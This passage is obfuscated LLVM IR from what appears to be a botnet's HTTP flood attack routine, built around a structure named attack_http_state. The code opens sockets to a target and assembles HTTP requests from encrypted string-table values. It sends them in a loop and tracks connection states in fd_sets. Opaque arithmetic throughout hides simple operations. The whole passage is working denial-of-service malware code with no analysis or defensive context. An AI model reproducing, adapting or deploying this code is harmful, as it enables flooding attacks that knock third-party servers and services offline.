  %460 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %459, i16* %460, align 2
  %461 = load i32, i32* %27, align 4
  %462 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %462, i32 0, i32 2
  store i32 %461, i32* %463, align 4
  %464 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %465 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %464, i32 0, i32 1
  store i8 2, i8* %465, align 4
  %466 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %466, i32 0, i32 0
  %468 = load i32, i32* %467, align 4
  %469 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %470 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %470, %struct.sockaddr** %469, align 8
  %471 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %472 = load %struct.sockaddr*, %struct.sockaddr** %471, align 8
  %473 = call i32 @connect(i32 %468, %struct.sockaddr* %472, i32 16)
  %474 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %475 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %474, i32 0, i32 0
  %476 = load i32, i32* %475, align 4
  %477 = srem i32 %476, 64
  %478 = zext i32 %477 to i64
  %479 = shl i64 1, %478
  %480 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %481 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %482 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %481, i32 0, i32 0
  %483 = load i32, i32* %482, align 4
  %484 = sdiv i32 %483, 64
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds [16 x i64], [16 x i64]* %480, i64 0, i64 %485
  %487 = load i64, i64* %486, align 8
  %488 = and i64 %487, %479
  %489 = xor i64 %487, %479
  %490 = or i64 %488, %489
  %491 = or i64 %487, %479
  store i64 %490, i64* %486, align 8
  %492 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %493 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %492, i32 0, i32 0
  %494 = load i32, i32* %493, align 4
  %495 = load i32, i32* %23, align 4
  %496 = icmp sgt i32 %494, %495
  br i1 %496, label %497, label %506

; <label>:497:                                    ; preds = %434
  %498 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %499 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %498, i32 0, i32 0
  %500 = load i32, i32* %499, align 4
  %501 = sub i32 0, %500
  %502 = sub i32 0, 1
  %503 = add i32 %501, %502
  %504 = sub i32 0, %503
  %505 = add nsw i32 %500, 1
  store i32 %504, i32* %23, align 4
  br label %506

; <label>:506:                                    ; preds = %497, %434
  br label %1027

; <label>:507:                                    ; preds = %411
  %508 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %508, i32 0, i32 1
  %510 = load i8, i8* %509, align 4
  %511 = zext i8 %510 to i32
  %512 = icmp eq i32 %511, 2
  br i1 %512, label %513, label %564

; <label>:513:                                    ; preds = %507
  %514 = load i32, i32* %27, align 4
  %515 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %516 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %515, i32 0, i32 2
  %517 = load i32, i32* %516, align 4
  %518 = sub i32 %514, -747932665
  %519 = sub i32 %518, %517
  %520 = add i32 %519, -747932665
  %521 = sub i32 %514, %517
  %522 = icmp ugt i32 %520, 30
  br i1 %522, label %523, label %532

; <label>:523:                                    ; preds = %513
  %524 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %525 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %524, i32 0, i32 1
  store i8 0, i8* %525, align 4
  %526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %526, i32 0, i32 0
  %528 = load i32, i32* %527, align 4
  %529 = call i32 @close(i32 %528)
  %530 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %531 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %530, i32 0, i32 0
  store i32 -1, i32* %531, align 4
  br label %1028

; <label>:532:                                    ; preds = %513
  %533 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %534 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %533, i32 0, i32 0
  %535 = load i32, i32* %534, align 4
  %536 = srem i32 %535, 64
  %537 = zext i32 %536 to i64
  %538 = shl i64 1, %537
  %539 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %540 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %541 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %540, i32 0, i32 0
  %542 = load i32, i32* %541, align 4
  %543 = sdiv i32 %542, 64
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds [16 x i64], [16 x i64]* %539, i64 0, i64 %544
  %546 = load i64, i64* %545, align 8
  %547 = and i64 %546, %538
  %548 = xor i64 %546, %538
  %549 = or i64 %547, %548
  %550 = or i64 %546, %538
  store i64 %549, i64* %545, align 8
  %551 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %552 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %551, i32 0, i32 0
  %553 = load i32, i32* %552, align 4
  %554 = load i32, i32* %23, align 4
  %555 = icmp sgt i32 %553, %554
  br i1 %555, label %556, label %563

; <label>:556:                                    ; preds = %532
  %557 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %558 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %557, i32 0, i32 0
  %559 = load i32, i32* %558, align 4
  %560 = sub i32 0, 1
  %561 = sub i32 %559, %560
  %562 = add nsw i32 %559, 1
  store i32 %561, i32* %23, align 4
  br label %563

; <label>:563:                                    ; preds = %556, %532
  br label %1026

; <label>:564:                                    ; preds = %507
  %565 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %566 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %565, i32 0, i32 1
  %567 = load i8, i8* %566, align 4
  %568 = zext i8 %567 to i32
  %569 = icmp eq i32 %568, 4
  br i1 %569, label %570, label %866

; <label>:570:                                    ; preds = %564
  %571 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %572 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %571, i32 0, i32 14
  store i32 -1, i32* %572, align 4
  %573 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %574 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %573, i32 0, i32 11
  store i32 0, i32* %574, align 4
  %575 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %576 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %575, i32 0, i32 18
  %577 = getelementptr inbounds [1024 x i8], [1024 x i8]* %576, i32 0, i32 0
  call void @util_zero(i8* %577, i32 1024)
  %578 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %578, i32 0, i32 17
  store i32 0, i32* %579, align 4
  %580 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %580, i32 10240)
  %581 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %582 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %583 = call i32 @util_strlen(i8* %582)
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds i8, i8* %581, i64 %584
  %586 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %587 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %586, i32 0, i32 9
  %588 = getelementptr inbounds [9 x i8], [9 x i8]* %587, i32 0, i32 0
  %589 = call i32 @util_strcpy(i8* %585, i8* %588)
  %590 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %591 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %592 = call i32 @util_strlen(i8* %591)
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds i8, i8* %590, i64 %593
  %595 = call i32 @util_strcpy(i8* %594, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %596 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %597 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %598 = call i32 @util_strlen(i8* %597)
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds i8, i8* %596, i64 %599
  %601 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %602 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %601, i32 0, i32 6
  %603 = getelementptr inbounds [257 x i8], [257 x i8]* %602, i32 0, i32 0
  %604 = call i32 @util_strcpy(i8* %600, i8* %603)
  %605 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %606 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %607 = call i32 @util_strlen(i8* %606)
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds i8, i8* %605, i64 %608
  %610 = call i32 @util_strcpy(i8* %609, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %611 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %612 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %613 = call i32 @util_strlen(i8* %612)
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds i8, i8* %611, i64 %614
  %616 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %617 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %616, i32 0, i32 5
  %618 = getelementptr inbounds [512 x i8], [512 x i8]* %617, i32 0, i32 0
  %619 = call i32 @util_strcpy(i8* %615, i8* %618)
  %620 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %621 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %622 = call i32 @util_strlen(i8* %621)
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds i8, i8* %620, i64 %623
  %625 = call i32 @util_strcpy(i8* %624, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %626 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %627 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %628 = call i32 @util_strlen(i8* %627)
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds i8, i8* %626, i64 %629
  %631 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %632 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %631, i32 0, i32 7
  %633 = getelementptr inbounds [129 x i8], [129 x i8]* %632, i32 0, i32 0
  %634 = call i32 @util_strcpy(i8* %630, i8* %633)
  %635 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %636 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %637 = call i32 @util_strlen(i8* %636)
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds i8, i8* %635, i64 %638
  %640 = call i32 @util_strcpy(i8* %639, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 39)
  %641 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %642 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %643 = call i32 @util_strlen(i8* %642)
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds i8, i8* %641, i64 %644
  %646 = call i8* @table_retrieve_val(i32 39, i32* null)
  %647 = call i32 @util_strcpy(i8* %645, i8* %646)
  call void @table_lock_val(i8 zeroext 39)
  %648 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %649 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %650 = call i32 @util_strlen(i8* %649)
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds i8, i8* %648, i64 %651
  %653 = call i32 @util_strcpy(i8* %652, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 40)
  %654 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %655 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %656 = call i32 @util_strlen(i8* %655)
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds i8, i8* %654, i64 %657
  %659 = call i8* @table_retrieve_val(i32 40, i32* null)
  %660 = call i32 @util_strcpy(i8* %658, i8* %659)
  call void @table_lock_val(i8 zeroext 40)
  %661 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %662 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %663 = call i32 @util_strlen(i8* %662)
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds i8, i8* %661, i64 %664
  %666 = call i32 @util_strcpy(i8* %665, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 41)
  %667 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %668 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %669 = call i32 @util_strlen(i8* %668)
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds i8, i8* %667, i64 %670
  %672 = call i8* @table_retrieve_val(i32 41, i32* null)
  %673 = call i32 @util_strcpy(i8* %671, i8* %672)
  call void @table_lock_val(i8 zeroext 41)
  %674 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %675 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %676 = call i32 @util_strlen(i8* %675)
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds i8, i8* %674, i64 %677
  %679 = call i32 @util_strcpy(i8* %678, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %680 = load i8*, i8** %14, align 8
  %681 = icmp ne i8* %680, null
  br i1 %681, label %682, label %723

; <label>:682:                                    ; preds = %570
  call void @table_unlock_val(i8 zeroext 42)
  %683 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %684 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %685 = call i32 @util_strlen(i8* %684)
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds i8, i8* %683, i64 %686
  %688 = call i8* @table_retrieve_val(i32 42, i32* null)
  %689 = call i32 @util_strcpy(i8* %687, i8* %688)
  call void @table_lock_val(i8 zeroext 42)
  %690 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %691 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %692 = call i32 @util_strlen(i8* %691)
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds i8, i8* %690, i64 %693
  %695 = call i32 @util_strcpy(i8* %694, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %696 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %697 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %698 = call i32 @util_strlen(i8* %697)
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds i8, i8* %696, i64 %699
  %701 = call i8* @table_retrieve_val(i32 47, i32* null)
  %702 = call i32 @util_strcpy(i8* %700, i8* %701)
  %703 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %704 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %705 = call i32 @util_strlen(i8* %704)
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds i8, i8* %703, i64 %706
  %708 = call i32 @util_strcpy(i8* %707, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %709 = load i8*, i8** %14, align 8
  %710 = call i32 @util_strlen(i8* %709)
  %711 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %712 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %713 = call i32 @util_strlen(i8* %712)
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds i8, i8* %711, i64 %714
  %716 = call i8* @util_itoa(i32 %710, i32 10, i8* %715)
  %717 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %718 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %719 = call i32 @util_strlen(i8* %718)
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds i8, i8* %717, i64 %720
  %722 = call i32 @util_strcpy(i8* %721, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %723

; <label>:723:                                    ; preds = %682, %570
  %724 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %725 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %724, i32 0, i32 15
  %726 = load i32, i32* %725, align 4
  %727 = icmp sgt i32 %726, 0
  br i1 %727, label %728, label %774

; <label>:728:                                    ; preds = %723
  %729 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %730 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %731 = call i32 @util_strlen(i8* %730)
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds i8, i8* %729, i64 %732
  %734 = call i32 @util_strcpy(i8* %733, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %735

; <label>:735:                                    ; preds = %760, %728
  %736 = load i32, i32* %10, align 4
  %737 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %738 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %737, i32 0, i32 15
  %739 = load i32, i32* %738, align 4
  %740 = icmp slt i32 %736, %739
  br i1 %740, label %741, label %767

; <label>:741:                                    ; preds = %735
  %742 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %743 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %744 = call i32 @util_strlen(i8* %743)
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds i8, i8* %742, i64 %745
  %747 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %748 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %747, i32 0, i32 16
  %749 = load i32, i32* %10, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %748, i64 0, i64 %750
  %752 = getelementptr inbounds [128 x i8], [128 x i8]* %751, i32 0, i32 0
  %753 = call i32 @util_strcpy(i8* %746, i8* %752)
  %754 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %755 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %756 = call i32 @util_strlen(i8* %755)
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds i8, i8* %754, i64 %757
  %759 = call i32 @util_strcpy(i8* %758, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %760

; <label>:760:                                    ; preds = %741
  %761 = load i32, i32* %10, align 4
  %762 = sub i32 0, %761
  %763 = sub i32 0, 1
  %764 = add i32 %762, %763
  %765 = sub i32 0, %764
  %766 = add nsw i32 %761, 1
  store i32 %765, i32* %10, align 4
  br label %735

; <label>:767:                                    ; preds = %735
  %768 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %769 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %770 = call i32 @util_strlen(i8* %769)
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds i8, i8* %768, i64 %771
  %773 = call i32 @util_strcpy(i8* %772, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %774

; <label>:774:                                    ; preds = %767, %723
  %775 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %776 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %777 = call i32 @util_strlen(i8* %776)
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds i8, i8* %775, i64 %778
  %780 = call i32 @util_strcpy(i8* %779, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %781 = load i8*, i8** %14, align 8
  %782 = icmp ne i8* %781, null
  br i1 %782, label %783, label %791

; <label>:783:                                    ; preds = %774
  %784 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %785 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %786 = call i32 @util_strlen(i8* %785)
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds i8, i8* %784, i64 %787
  %789 = load i8*, i8** %14, align 8
  %790 = call i32 @util_strcpy(i8* %788, i8* %789)
  br label %791

; <label>:791:                                    ; preds = %783, %774
  %792 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %793 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %792, i32 0, i32 9
  %794 = getelementptr inbounds [9 x i8], [9 x i8]* %793, i32 0, i32 0
  %795 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %796 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %795, i32 0, i32 10
  %797 = getelementptr inbounds [9 x i8], [9 x i8]* %796, i32 0, i32 0
  %798 = call signext i8 @util_strcmp(i8* %794, i8* %797)
  %799 = icmp ne i8 %798, 0
  br i1 %799, label %808, label %800

; <label>:800:                                    ; preds = %791
  %801 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %802 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %801, i32 0, i32 9
  %803 = getelementptr inbounds [9 x i8], [9 x i8]* %802, i32 0, i32 0
  %804 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %805 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %804, i32 0, i32 10
  %806 = getelementptr inbounds [9 x i8], [9 x i8]* %805, i32 0, i32 0
  %807 = call i32 @util_strcpy(i8* %803, i8* %806)
  br label %808

; <label>:808:                                    ; preds = %800, %791
  %809 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %810 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %809, i32 0, i32 0
  %811 = load i32, i32* %810, align 4
  %812 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %813 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %814 = call i32 @util_strlen(i8* %813)
  %815 = sext i32 %814 to i64
  %816 = call i64 @send(i32 %811, i8* %812, i64 %815, i32 16384)
  %817 = load i32, i32* %27, align 4
  %818 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %819 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %818, i32 0, i32 3
  store i32 %817, i32* %819, align 4
  %820 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %821 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %820, i32 0, i32 1
  store i8 6, i8* %821, align 4
  %822 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %823 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %822, i32 0, i32 0
  %824 = load i32, i32* %823, align 4
  %825 = srem i32 %824, 64
  %826 = zext i32 %825 to i64
  %827 = shl i64 1, %826
  %828 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %829 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %830 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %829, i32 0, i32 0
  %831 = load i32, i32* %830, align 4
  %832 = sdiv i32 %831, 64
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds [16 x i64], [16 x i64]* %828, i64 0, i64 %833
  %835 = load i64, i64* %834, align 8
  %836 = xor i64 %835, -1
  %837 = xor i64 %827, -1
  %838 = xor i64 -7683870208957387685, -1
  %839 = and i64 %836, -7683870208957387685
  %840 = and i64 %835, %838
  %841 = and i64 %837, -7683870208957387685
  %842 = and i64 %827, %838
  %843 = or i64 %839, %840
  %844 = or i64 %841, %842
  %845 = xor i64 %843, %844
  %846 = or i64 %836, %837
  %847 = xor i64 %846, -1
  %848 = or i64 -7683870208957387685, %838
  %849 = and i64 %847, %848
  %850 = or i64 %845, %849
  %851 = or i64 %835, %827
  store i64 %850, i64* %834, align 8
  %852 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %853 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %852, i32 0, i32 0
  %854 = load i32, i32* %853, align 4
  %855 = load i32, i32* %23, align 4
  %856 = icmp sgt i32 %854, %855
  br i1 %856, label %857, label %865

; <label>:857:                                    ; preds = %808
  %858 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %859 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %858, i32 0, i32 0
  %860 = load i32, i32* %859, align 4
  %861 = sub i32 %860, 1825122752
  %862 = add i32 %861, 1
  %863 = add i32 %862, 1825122752
  %864 = add nsw i32 %860, 1
  store i32 %863, i32* %23, align 4
  br label %865

; <label>:865:                                    ; preds = %857, %808
  br label %1025

; <label>:866:                                    ; preds = %564
  %867 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %868 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %867, i32 0, i32 1
  %869 = load i8, i8* %868, align 4
  %870 = zext i8 %869 to i32
  %871 = icmp eq i32 %870, 6
  br i1 %871, label %872, label %906

; <label>:872:                                    ; preds = %866
  %873 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %874 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %873, i32 0, i32 0
  %875 = load i32, i32* %874, align 4
  %876 = srem i32 %875, 64
  %877 = zext i32 %876 to i64
  %878 = shl i64 1, %877
  %879 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %880 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %881 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %880, i32 0, i32 0
  %882 = load i32, i32* %881, align 4
  %883 = sdiv i32 %882, 64
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds [16 x i64], [16 x i64]* %879, i64 0, i64 %884
  %886 = load i64, i64* %885, align 8
  %887 = and i64 %886, %878
  %888 = xor i64 %886, %878
  %889 = or i64 %887, %888
  %890 = or i64 %886, %878
  store i64 %889, i64* %885, align 8
  %891 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %892 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %891, i32 0, i32 0
  %893 = load i32, i32* %892, align 4
  %894 = load i32, i32* %23, align 4
  %895 = icmp sgt i32 %893, %894
  br i1 %895, label %896, label %905

; <label>:896:                                    ; preds = %872
  %897 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %898 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %897, i32 0, i32 0
  %899 = load i32, i32* %898, align 4
  %900 = sub i32 0, %899
  %901 = sub i32 0, 1
  %902 = add i32 %900, %901
  %903 = sub i32 0, %902
  %904 = add nsw i32 %899, 1
  store i32 %903, i32* %23, align 4
  br label %905

; <label>:905:                                    ; preds = %896, %872
  br label %1024

; <label>:906:                                    ; preds = %866
  %907 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %908 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %907, i32 0, i32 1
  %909 = load i8, i8* %908, align 4
  %910 = zext i8 %909 to i32
  %911 = icmp eq i32 %910, 7
  br i1 %911, label %912, label %945

; <label>:912:                                    ; preds = %906
  %913 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %914 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %913, i32 0, i32 0
  %915 = load i32, i32* %914, align 4
  %916 = srem i32 %915, 64
  %917 = zext i32 %916 to i64
  %918 = shl i64 1, %917
  %919 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %920 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %921 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %920, i32 0, i32 0
  %922 = load i32, i32* %921, align 4
